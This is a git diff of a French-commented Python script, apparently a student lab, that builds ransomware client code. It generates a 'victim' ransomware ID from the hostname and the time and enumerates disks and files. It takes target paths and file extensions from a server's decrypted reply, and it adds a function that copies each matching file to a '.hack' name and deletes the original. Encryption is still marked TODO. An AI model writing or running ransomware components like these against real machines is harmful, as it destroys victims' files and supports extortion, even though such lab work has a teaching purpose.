@@ -14,40 +14,36 @@ HASH = None
 STATE = 'INITIALIZE'
 
 
-def explore(chemin):
+def explore(path):
     """
-
-    :param chemin: chemin que la fonction glob utilisera pour retourner les chemins de fichiers
+    Cette fonction récupère tous les chemins des fichiers d'un chemin donné en paramètre
+    :param path: str, chemin que la fonction glob utilisera pour retourner les chemins de fichiers
     :return: list, liste contenant tous les chemins des fichiers exploré avec le chemin donné
     """
-    chemin_str = str(chemin)
-    path_files = glob.glob(f'{chemin_str}:/**/*', recursive = True)
+    chemin_str = fr"{path}"
+    path_files = glob.glob(f'{chemin_str}/**/*', recursive = True)
 
     return path_files
 
-def file_type(chemin):
+def file_type(path):
+    """
+    Cette fonction détermine et retourne le type de fichié donné en paramètre
+    :param path: str, le chemin du fichier pour lequel on veut savoir le type
+    :return: str, le type du fichier
+    """
 
     type = ''
 
-    if os.path.isdir(chemin):
+    # Vérifie si le chemin donné correspond à un dossier ou un fichier
+    # Si c'est un dossier, on retourne directement 'dir'
+    if os.path.isdir(path):
         type = 'dir'
-    elif os.path.isfile(chemin):
-        type = str(chemin)[-5:-1]
+    # Si c'est un fichier
+    elif os.path.isfile(path):
+        # On détermine son extension avec os.path.splitext
+        type = os.path.splitext(path)[1]
 
     return type
-
-def generate_ID_hash_ransomware():
-    """
-    Cette fonction récupère l'heure courante et le nom de l'hote pour pouvoir générer et retourner une clé unique qui
-    sera l'identifiant du ransomware de la victime :return: str, la clé unique générée
-    """
-    # Concatène le nom de l'hôte et l'heure courante
-    key = socket.gethostname() + str(datetime.now().time())
-    # Utitilise une fonction de hash (SHA256) sur la concaténation des deux, ce qui donne une clé unique
-    hash_victim = str(hashlib.sha256(key.encode()).hexdigest())
-
-    return hash_victim
-
 
 def get_type_system():
     """
@@ -68,7 +64,6 @@ def get_type_system():
 
     return type_sys
 
-
 def get_disk():
     """
     Cette fonction utilise la méthode disk_partitions pour récupérer un objet, sur lequel on utilisera la méthode
@@ -77,9 +72,41 @@ def get_disk():
     """
     disks = []
     for partition in psutil.disk_partitions():
-        disks.append(str(partition.device))
-    # Enlever // ?
+        temp = str(partition.device)[:-1]
+        disks.append(temp)
+
     return disks
+
+def generate_ID_hash_ransomware():
+    """
+    Cette fonction récupère l'heure courante et le nom de l'hote pour pouvoir générer et retourner une clé unique qui
+    sera l'identifiant du ransomware de la victime
+    :return: str, la clé unique générée
+    """
+    # Concatène le nom de l'hôte et l'heure courante
+    key = socket.gethostname() + str(datetime.now().time())
+    # Utitilise une fonction de hash (SHA256) sur la concaténation des deux, ce qui donne une clé unique
+    hash_victim = str(hashlib.sha256(key.encode()).hexdigest())
+
+    return hash_victim
+
+def chiffre(path):
+    """
+    Cette fonction ouvre un fichier en mode binaire et recopie son contenu vers un
+    nom de fichier étendu de l'extension .hack avant d'effacer la source
+    :param path: str, le chemin du fichier
+    """
+    with open(f"{path}", "rb") as fichier1:
+        content = fichier1.read()
+
+    with open(f"{path}.hack", "xb") as fichier2:
+        fichier2.write(content)
+
+    # TODO peut-être chiffrer le contenu du fichier
+
+    os.remove(path)
+
+
 
 
 def main():
@@ -112,6 +139,20 @@ def main():
 
         if message.get_message_type(decrypted_data) == 'INITIALIZE_RESP':
             net.CloseCon(socket_serv)
+
+
+        #Point 6 labo 4
+        #_______________________
+
+        list_extensions = decrypted_data['SETTING']['FILE_EXT']
+        list_chemins_fichiers = decrypted_data['SETTING']['PATHS']
+
+        compteur_fichiers_chiffres = 0
+
+        for fichier in list_chemins_fichiers:
+            if file_type(fichier) in list_extensions:
+                chiffre(fichier)
+                compteur_fichiers_chiffres += 1
 
 
 if __name__ == '__main__':
